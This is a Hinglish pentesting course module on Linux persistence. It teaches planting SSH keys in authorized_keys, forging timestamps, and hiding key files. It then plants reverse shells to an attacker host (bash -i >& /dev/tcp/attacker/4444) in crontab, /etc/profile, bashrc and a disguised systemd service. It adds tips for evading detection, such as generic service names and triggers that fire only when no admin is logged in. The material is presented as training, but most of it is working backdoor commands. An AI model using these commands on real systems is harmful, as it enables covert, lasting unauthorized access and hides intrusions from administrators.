# **Module 8: Persistence & Covering Tracks**

## **Topic 1: SSH Keys se Chupke se Entry (Stealthy SSH Access)**

### **1. Topic ka Naam / Ek Line Mein Summary** ðŸš€
**SSH Key Persistence:** Apni SSH key add karke permanent backdoor access - silent aur reliable.

### **2. Ye Kya Hai? (What is it?)**
SSH key persistence wo technique hai jisse hum apni public SSH key ko target system ke `authorized_keys` file mein add karte hain, jisse hum bina password ke anytime SSH access le sakte hain.

**Analogy:** Ye aise hai jaise aap kisi ghar ki duplicate chabi bana lete hain. Original owner ko pata bhi nahi chalta aur aap jab chahe andar aa sakte hain bina doorbell bajaye.

### **3. Pentesting mein Kyun Use Karte Hain? (Why use it?)**
- Permanent backdoor access
- Password-less authentication
- Stealthy (logs mein normal login dikhta hai)
- Reliable (password change se affect nahi)
- Multiple users ke liye

### **4. Ise Kab Use Karna Chahiye? (When to use it?)**
- Root access milne ke baad
- Long-term access chahiye
- Persistence establish karna ho
- Post-exploitation phase mein

### **5. Agar Ye Pata Nahi Hoga Toh Kya Hoga? (If not known then what?)** ðŸ˜Ÿ
Access lose ho jayega agar password change ho. Har baar exploit karna padega. Reliable backdoor nahi rahega. Long-term access impossible.

### **6. Ye Kaise Kaam Karta Hai? / Syntax aur Options**

**SSH Key Generation:**
```bash
# Attacker machine par
ssh-keygen -t rsa -b 4096 -f ~/.ssh/backdoor
# Public key: ~/.ssh/backdoor.pub
# Private key: ~/.ssh/backdoor
```

**Target System Par:**
```bash
# Method 1: Direct add
echo "ssh-rsa AAAA...your_public_key... attacker@kali" >> ~/.ssh/authorized_keys

# Method 2: Root ke liye
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...key..." >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# Method 3: Specific user
echo "ssh-rsa AAAA...key..." >> /home/username/.ssh/authorized_keys
chown username:username /home/username/.ssh/authorized_keys
```

**Connection:**
```bash
# Attacker machine se
ssh -i ~/.ssh/backdoor user@target-ip
ssh -i ~/.ssh/backdoor root@target-ip
```

**Stealth Techniques:**
```bash
# Hidden filename
echo "key" >> ~/.ssh/.authorized_keys2

# Modify sshd_config
AuthorizedKeysFile .ssh/authorized_keys .ssh/.backup_keys

# Timestamp preserve
touch -r /etc/passwd ~/.ssh/authorized_keys
```

### **7. Command Example (Poori Explanation ke Saath)**

**Scenario 1: Key generation**
```bash
ssh-keygen -t ed25519 -f ~/.ssh/persistence -N ""
```

| Command Part | Matlab |
|--------------|--------|
| `-t ed25519` | Modern, secure algorithm |
| `-f ~/.ssh/persistence` | Output filename |
| `-N ""` | No passphrase |

**Scenario 2: Public key add karna**
```bash
cat ~/.ssh/persistence.pub
# Copy output

# Target par
echo "ssh-ed25519 AAAA...key... attacker" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

**Scenario 3: Root access setup**
```bash
sudo su
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAA...key..." >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
```

**Scenario 4: Connection test**
```bash
ssh -i ~/.ssh/persistence root@target-ip
```

**Expected Output:** Direct root shell bina password.

### **8. Beginners ki Aam Galtiyan (Common Mistakes)**
- Permissions galat (700 for .ssh, 600 for authorized_keys)
- Public key ki jagah private key add karna
- Newline character miss karna (file corrupt)
- Ownership galat hona
- SSHD config mein PubkeyAuthentication disabled

### **9. Best Practices / Pro Tips**
- **CRITICAL Fix:** Hamesha permissions check: `chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys`
- **Stealth Tip:** Comment mein generic name: `ssh-rsa ...key... backup-script`
- Multiple locations mein keys (root + normal users)
- Timestamp preserve: `touch -r /etc/passwd ~/.ssh/authorized_keys`
- Ed25519 keys use karein (modern, secure, small)

### **10. Asli Pentesting ka Scenario (Real-World Scenario)**
Ek pentester ne web server compromise kiya aur root access li. Usne apni SSH public key `/root/.ssh/authorized_keys` mein add ki. Password change hone ke baad bhi wo anytime `ssh -i key root@server` se access le sakta tha. Admin ko pata hi nahi chala kyunki logs mein normal SSH login dikhta tha.

### **11. Checklist / Chota Recap (TL;DR)**
- `ssh-keygen` - Key pair generate
- Public key target par add
- Permissions: 700 (.ssh), 600 (authorized_keys)
- `ssh -i private_key user@host` - Connect
- Timestamp preserve for stealth

### **12. Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Public aur private key mein kya fark hai?**
A: Public key target par add hoti hai, private key attacker ke paas rahti hai (password ki tarah).

**Q2: Permissions kyun important hain?**
A: SSH security ke liye strict permissions check karta hai. Galat permissions = key ignore.

**Q3: Multiple keys kaise add karein?**
A: Har key ek nayi line par: `echo "key1" >> file && echo "key2" >> file`

**Q4: Detection kaise avoid karein?**
A: Generic comments, timestamp preserve, hidden filenames.

**Q5: Agar authorized_keys file nahi hai?**
A: Create karein: `mkdir -p ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys`

### **13. Practice ke liye Task**
1. `ssh-keygen -t ed25519 -f ~/test_key -N ""` - Key generate
2. `cat ~/test_key.pub` - Public key copy
3. `echo "public_key" >> ~/.ssh/authorized_keys` - Add
4. `chmod 600 ~/.ssh/authorized_keys` - Permissions
5. `ssh -i ~/test_key localhost` - Test

**Expected Output:** Password-less SSH login.

### **14. Extra / Advanced Jaankari (Optional)**
- **SSH Certificates:** More advanced than keys
- **AuthorizedKeysCommand:** Dynamic key loading
- **ForceCommand:** Restrict what key can do
- **Multiple AuthorizedKeysFile:** Backup locations

### **15. Aakhri Choti Summary (5 lines)**
- SSH keys password-less authentication provide karte hain
- Public key target par, private key attacker ke paas
- Permissions critical: 700 (.ssh), 600 (authorized_keys)
- Stealth: Generic comments, timestamp preserve
- Reliable persistence method

> **Ye Zaroor Yaad Rakhein**
> 1. Public key target par add karo
> 2. Permissions: `chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys`
> 3. Ed25519 modern aur secure
> 4. Timestamp preserve: `touch -r`
> 5. Multiple locations = better persistence

---

## **Topic 2: Cron Jobs, Bash Profile & Systemd Service Persistence**

### **1. Topic ka Naam / Ek Line Mein Summary** ðŸš€
**Multiple Persistence Methods:** Cron, bash profile, systemd - har reboot par automatic backdoor.

### **2. Ye Kya Hai? (What is it?)**
Ye wo techniques hain jisse hum system ke automatic execution mechanisms (cron, shell profiles, systemd) ko abuse karke persistent backdoor establish karte hain jo reboot ke baad bhi active rahe.

**Analogy:** Ye aise hai jaise aap kisi building mein automatic doors install kar dete hain jo specific time par (cron) ya jab bhi koi enter kare (bash profile) ya building start ho (systemd) to automatically khul jaate hain.

### **3. Pentesting mein Kyun Use Karte Hain? (Why use it?)**
- Reboot-persistent backdoor
- Automatic execution
- Multiple fallback options
- Scheduled access
- Stealthy methods

### **4. Ise Kab Use Karna Chahiye? (When to use it?)**
- Long-term persistence chahiye
- System reboot ho sakta hai
- Scheduled access chahiye
- Multiple backdoors chahiye

### **5. Agar Ye Pata Nahi Hoga Toh Kya Hoga? (If not known then what?)** ðŸ˜Ÿ
Reboot ke baad access lose ho jayega. Manual re-exploitation karna padega. Reliable persistence nahi rahega.

### **6. Ye Kaise Kaam Karta Hai? / Syntax aur Options**

**Cron Job Persistence:**
```bash
# User crontab
(crontab -l; echo "*/10 * * * * /tmp/.backdoor.sh") | crontab -

# System crontab
echo "*/5 * * * * root /usr/local/bin/.update.sh" >> /etc/crontab

# Cron directory
echo "*/10 * * * * root bash -i >& /dev/tcp/attacker/4444 0>&1" > /etc/cron.d/update
```

**Bash Profile Persistence:**
```bash
# User profile
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1 &' >> ~/.bashrc
echo 'nohup bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1" &' >> ~/.profile

# System-wide
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1 &' >> /etc/profile
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1 &' >> /etc/bash.bashrc
```

**Systemd Service Persistence:**
```bash
# Create service file
cat > /etc/systemd/system/update-checker.service << EOF
[Unit]
Description=System Update Checker
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable update-checker.service
systemctl start update-checker.service
```

**Stealth Techniques:**
```bash
# Hidden cron
echo "@reboot /usr/bin/.system-check" | crontab -

# Conditional execution (only if no one logged in)
echo 'if [ $(who | wc -l) -eq 0 ]; then /tmp/.bd; fi' >> ~/.bashrc

# Time-based
echo '[ $(date +%H) -ge 22 ] && /tmp/.bd &' >> ~/.bashrc
```

### **7. Command Example (Poori Explanation ke Saath)**

**Scenario 1: Cron persistence**
```bash
(crontab -l 2>/dev/null; echo "@reboot sleep 60 && bash -i >& /dev/tcp/10.10.10.10/4444 0>&1") | crontab -
```

| Command Part | Matlab |
|--------------|--------|
| `crontab -l` | Existing cron list |
| `@reboot` | System boot par run |
| `sleep 60` | 60 sec wait (network ready) |
| `bash -i >& /dev/tcp/...` | Reverse shell |

**Scenario 2: Bashrc persistence**
```bash
echo 'export PROMPT_COMMAND="bash -i >& /dev/tcp/10.10.10.10/4444 0>&1 &"' >> ~/.bashrc
```

**Scenario 3: Systemd service**
```bash
cat > /lib/systemd/system/systemd-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart=/bin/bash /usr/local/bin/.update.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable systemd-update.service
```

### **8. Beginners ki Aam Galtiyan (Common Mistakes)**
- Cron syntax galat
- Bashrc mein infinite loop (system hang)
- Systemd service enable karna bhoolna
- Network ready hone se pehle connect karna
- Obvious service names

### **9. Best Practices / Pro Tips**
- **CRITICAL Fix:** Multiple methods use karein (redundancy)
- **Stealth Tip:** Generic names: `update-checker`, `system-monitor`
- Conditional execution (only when no one logged in)
- Time-based execution (night time)
- Error output redirect: `2>/dev/null`

### **10. Asli Pentesting ka Scenario (Real-World Scenario)**
Ek pentester ne 3 persistence methods setup kiye: (1) Cron job har 10 minute, (2) Bashrc mein backdoor, (3) Systemd service. Admin ne bashrc wala detect kar liya aur remove kiya, lekin cron aur systemd active rahe. Pentester ko access milta raha.

### **11. Checklist / Chota Recap (TL;DR)**
- Cron: `(crontab -l; echo "job") | crontab -`
- Bashrc: `echo 'command' >> ~/.bashrc`
- Systemd: Service file + `systemctl enable`
- Multiple methods for redundancy
- Generic names for stealth

### **12. Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Sabse reliable method kaun sa?**
A: Systemd service - automatically restart hota hai aur boot par start.

**Q2: Bashrc har login par trigger hota hai?**
A: Haan, interactive shell ke liye. Non-interactive ke liye `.profile` use karein.

**Q3: Cron job test kaise karein?**
A: `*/1 * * * * command` (har minute) se test karein.

**Q4: Detection kaise avoid karein?**
A: Generic names, conditional execution, time-based triggers.

**Q5: Multiple methods kyun?**
A: Agar ek detect ho jaye to dusre active rahein (redundancy).

### **13. Practice ke liye Task**
1. `echo "* * * * * echo 'test' >> /tmp/crontest" | crontab -` - Cron test
2. `watch -n 5 cat /tmp/crontest` - Monitor
3. `crontab -r` - Remove
4. `echo 'echo "bashrc test"' >> ~/.bashrc` - Bashrc test
5. `bash` - New shell (trigger)

**Expected Output:** Cron file update, bashrc message.

### **14. Extra / Advanced Jaankari (Optional)**
- **At Jobs:** One-time scheduled tasks
- **Systemd Timers:** Modern cron alternative
- **Init.d Scripts:** Legacy persistence
- **LD_PRELOAD:** Library injection persistence

### **15. Aakhri Choti Summary (5 lines)**
- Multiple persistence methods for redundancy
- Cron: Scheduled execution
- Bashrc: Login-triggered
- Systemd: Boot-persistent service
- Stealth: Generic names, conditional execution

> **Ye Zaroor Yaad Rakhein**
> 1. Multiple methods = better persistence
> 2. Cron: `@reboot` for boot-time
> 3. Bashrc: Login-triggered backdoor
> 4. Systemd: Most reliable method
> 5. Generic names for stealth

---

## **Module 8 Takeaway (Part 1)**

Is module ke pehle 2 topics mein humne persistence techniques seekhe. SSH keys se password-less backdoor access milta hai jo reliable aur stealthy hai. Cron jobs, bash profiles, aur systemd services se automatic execution setup karte hain jo reboot ke baad bhi active rahe. Multiple persistence methods use karna important hai - agar ek detect ho jaye to dusre active rahein. Stealth maintain karna zaroori hai - generic names, timestamp preservation, aur conditional execution use karein.

**Next topics:** Data Exfiltration aur Covering Tracks! ðŸš€

